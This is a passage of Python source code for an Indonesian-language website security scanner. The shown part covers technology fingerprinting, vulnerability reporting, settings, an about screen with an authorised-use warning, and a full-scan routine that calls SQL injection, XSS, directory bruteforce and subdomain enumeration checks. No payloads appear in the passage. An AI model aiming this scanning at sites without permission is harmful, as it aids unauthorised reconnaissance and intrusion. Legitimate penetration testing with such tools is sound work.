                'Laravel': [r'laravel', r'csrf-token', r'mix-manifest.json'],
                'React': [r'react', r'__next', r'/_next/'],
                'Vue.js': [r'vue', r'__vue', r'vue-router'],
                'Angular': [r'angular', r'ng-', r'angular.js']
            }
            
            detected_tech = []
            
     
            html_content = response.text.lower()
            for tech, patterns in cms_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, html_content, re.IGNORECASE):
                        if tech not in detected_tech:
                            detected_tech.append(tech)
                            self.print_result("Technology Detected", tech, "success")
                            break
            
       
            server_header = response.headers.get('Server', '').lower()
            x_powered_by = response.headers.get('X-Powered-By', '').lower()
            
            server_tech = {
                'apache': 'Apache',
                'nginx': 'Nginx',
                'iis': 'IIS',
                'cloudflare': 'CloudFlare',
                'node': 'Node.js',
                'php': 'PHP',
                'asp.net': 'ASP.NET'
            }
            
            for key, tech in server_tech.items():
                if key in server_header or key in x_powered_by:
                    if tech not in detected_tech:
                        detected_tech.append(tech)
                        self.print_result("Server Technology", tech, "info")
            
            if not detected_tech:
                self.print_result("Technology Detection", "Tidak dapat mendeteksi CMS/technology", "warning")
            else:
                self.print_result("Technology Summary", f"Detected {len(detected_tech)} technologies", "success")
                
        except Exception as e:
            self.print_result("Technology Detection", f"Gagal: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")


    def vulnerability_report(self):
        self.banner()
        self.print_banner_section("VULNERABILITY REPORT")
        
        if not self.vulnerabilities_found:
            self.print_result("Vulnerability Report", "Tidak ada kerentanan yang ditemukan", "success")
        else:
            print(f"\n{Colors.RED}{Colors.BOLD}╔{'═' * 70}╗{Colors.END}")
            print(f"{Colors.RED}{Colors.BOLD}║ {'VULNERABILITY SUMMARY'.center(68)} ║{Colors.END}")
            print(f"{Colors.RED}{Colors.BOLD}╚{'═' * 70}╝{Colors.END}")
            
    
            high_vulns = [v for v in self.vulnerabilities_found if v['severity'] == 'HIGH']
            medium_vulns = [v for v in self.vulnerabilities_found if v['severity'] == 'MEDIUM']
            low_vulns = [v for v in self.vulnerabilities_found if v['severity'] == 'LOW']
            
            print(f"\n{Colors.RED}🔴 HIGH: {len(high_vulns)} vulnerabilities{Colors.END}")
            print(f"{Colors.ORANGE}🟡 MEDIUM: {len(medium_vulns)} vulnerabilities{Colors.END}")
            print(f"{Colors.YELLOW}🟢 LOW: {len(low_vulns)} vulnerabilities{Colors.END}")
            
        
            for i, vuln in enumerate(self.vulnerabilities_found, 1):
                print(f"\n{Colors.WHITE}{i}. {vuln['type']} [{vuln['severity']}]{Colors.END}")
                print(f"   {Colors.CYAN}Details: {vuln['details']}{Colors.END}")
                print(f"   {Colors.BLUE}Time: {vuln['timestamp']}{Colors.END}")
            
 
            export = input(f"\n{Colors.CYAN}Export report to file? (y/n): {Colors.END}").lower()
            if export == 'y':
                filename = f"vulnerability_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, 'w') as f:
                    f.write("VULNERABILITY REPORT\n")
                    f.write("=" * 50 + "\n")
                    for vuln in self.vulnerabilities_found:
                        f.write(f"\nType: {vuln['type']}\n")
                        f.write(f"Severity: {vuln['severity']}\n")
                        f.write(f"Details: {vuln['details']}\n")
                        f.write(f"Time: {vuln['timestamp']}\n")
                        f.write("-" * 50 + "\n")
                self.print_result("Report Exported", f"Saved as {filename}", "success")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def settings_configuration(self):
        self.banner()
        self.print_banner_section("SETTINGS & CONFIGURATION")
        
        print(f"{Colors.CYAN}Current Settings:{Colors.END}")
        self.print_result("User Agent", self.session.headers.get('User-Agent', 'Not set'), "info")
        self.print_result("Timeout", "10 seconds", "info")
        self.print_result("Threads", "50 (max)", "info")
        
        print(f"\n{Colors.CYAN}Configuration Options:{Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.END} Change User Agent")
        print(f"{Colors.GREEN}[2]{Colors.END} Set Custom Headers")
        print(f"{Colors.GREEN}[3]{Colors.END} Clear Vulnerability History")
        print(f"{Colors.GREEN}[4]{Colors.END} Back to Main Menu")
        
        choice = input(f"\n{Colors.CYAN}Select option [1-4]: {Colors.END}").strip()
        
        if choice == "1":
            new_ua = input(f"{Colors.CYAN}Enter new User Agent: {Colors.END}").strip()
            self.session.headers.update({'User-Agent': new_ua})
            self.print_result("User Agent", "Updated successfully", "success")
        elif choice == "2":
            header_name = input(f"{Colors.CYAN}Enter header name: {Colors.END}").strip()
            header_value = input(f"{Colors.CYAN}Enter header value: {Colors.END}").strip()
            self.session.headers.update({header_name: header_value})
            self.print_result("Custom Header", "Added successfully", "success")
        elif choice == "3":
            self.vulnerabilities_found = []
            self.print_result("Vulnerability History", "Cleared", "success")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def about_help(self):
        self.banner()
        self.print_banner_section("ABOUT & HELP")
        
        about_text = f"""
{Colors.CYAN}{Colors.BOLD}Alat Bantu Pro - Advanced Website Security Scanner{Colors.END}

{Colors.YELLOW}📖 Deskripsi:{Colors.END}
Alat Bantu Pro adalah comprehensive website security scanner 
yang dikhususkan untuk penggunaan di Termux/Linux. Dilengkapi dengan 
deteksi kerentanan yang akurat dan fitur-fitur profesional.

{Colors.YELLOW}🚀 Fitur Utama:{Colors.END}
{Colors.GREEN}✓{Colors.END} Advanced SQL Injection Scanner
{Colors.GREEN}✓{Colors.END} Comprehensive XSS Detection  
{Colors.GREEN}✓{Colors.END} Mass Port Scanning
{Colors.GREEN}✓{Colors.END} Detailed DNS & WHOIS Analysis
{Colors.GREEN}✓{Colors.END} Deep SSL/TLS Analysis
{Colors.GREEN}✓{Colors.END} Directory & File Bruteforce
{Colors.GREEN}✓{Colors.END} Massive Subdomain Enumeration
{Colors.GREEN}✓{Colors.END} Complete Header Security Check
{Colors.GREEN}✓{Colors.END} CMS & Technology Detection
{Colors.GREEN}✓{Colors.END} Professional Vulnerability Reporting

{Colors.YELLOW}🔧 Teknologi:{Colors.END}
{Colors.BLUE}•{Colors.END} Multi-threading untuk performa optimal
{Colors.BLUE}•{Colors.END} Pattern matching yang akurat
{Colors.BLUE}•{Colors.END} Real-time progress tracking
{Colors.BLUE}•{Colors.END} Comprehensive vulnerability database

{Colors.YELLOW}⚠️  Penggunaan yang Bertanggung Jawab:{Colors.END}
{Colors.RED}•{Colors.END} Hanya gunakan pada website yang Anda miliki
{Colors.RED}•{Colors.END} Atau website yang telah memberikan izin testing
{Colors.RED}•{Colors.END} Selalu patuhi hukum dan regulasi setempat
{Colors.RED}•{Colors.END} Jangan digunakan untuk aktivitas ilegal

{Colors.YELLOW}👨‍💻 Developer:{Colors.END}
Dikembangkan Dwi Bakti N Dev untuk tujuan edukasi dan penetration testing legal

{Colors.RED}{Colors.BOLD}
PERINGATAN: Gunakan alat ini dengan bijak dan bertanggung jawab!
Penulis tidak bertanggung jawab atas penyalahgunaan alat ini.
{Colors.END}
"""
        print(about_text)
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def scan_lengkap(self):
        self.banner()
        self.print_banner_section("COMPLETE SECURITY SCAN")
        
        self.get_target()
        
        print(f"\n{Colors.YELLOW}Memulai Complete Security Scan...{Colors.END}")
        self.scan_start_time = datetime.now()
        
        scan_steps = [
            ("🔍 Website Status Check", self.check_website_status),
            ("🛡️ Header Security Analysis", self.header_security_check_complete),
            ("🔐 SSL/TLS Deep Analysis", self.ssl_checker_deep),
            ("🌐 DNS & WHOIS Analysis", lambda: self.dns_whois_lookup_detailed()),
            ("🗃️ SQL Injection Scan", self.sql_injection_scan_advanced),
            ("🎯 XSS Vulnerability Scan", self.xss_scan_advanced),
            ("📁 Directory Bruteforce", self.directory_file_bruteforce),
            ("🌍 Subdomain Enumeration", lambda: self.subdomain_scanner_massive()),
            ("🔧 Technology Detection", self.cms_technology_detection)
        ]
        
        for step_name, step_function in scan_steps:
            self.print_result("SCAN STEP", step_name, "info")
            try:
                if step_name == "🌐 DNS & WHOIS Analysis":
                    step_function(urlparse(self.target_url).hostname)
                elif step_name == "🌍 Subdomain Enumeration":
                    step_function(urlparse(self.target_url).hostname)
                else:
                    step_function()
            except Exception as e:
                self.print_result("Scan Error", f"Failed in {step_name}: {str(e)}", "error")
            print()
        
        scan_duration = datetime.now() - self.scan_start_time
        self.print_result("SCAN COMPLETED", f"Duration: {scan_duration}", "success")
        
        if self.vulnerabilities_found:
            self.print_result("VULNERABILITIES", f"Found {len(self.vulnerabilities_found)} issues", "critical")
        else:
            self.print_result("VULNERABILITIES", "No critical issues found", "success")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def exit_program(self):
        print(f"\n{Colors.GREEN}Terima kasih telah menggunakan Alat Bantu Pro!{Colors.END}")
        print(f"{Colors.CYAN}Stay secure! 🛡️{Colors.END}")
        sys.exit(0)

def main():
    try:
  
        required_modules = ['requests', 'dns', 'tqdm']
        for module in required_modules:
            try:
                if module == 'dns':
                    import dns.resolver
                elif module == 'tqdm':
                    from tqdm import tqdm
            except ImportError:
                print(f"{Colors.RED}Error: Module {module} not installed.{Colors.END}")
                print(f"Install with: pip install {module}")
                sys.exit(1)
        
        alat = AlatBantuPro()
        alat.menu_utama()
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}Program dihentikan oleh pengguna.{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}Error: {str(e)}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()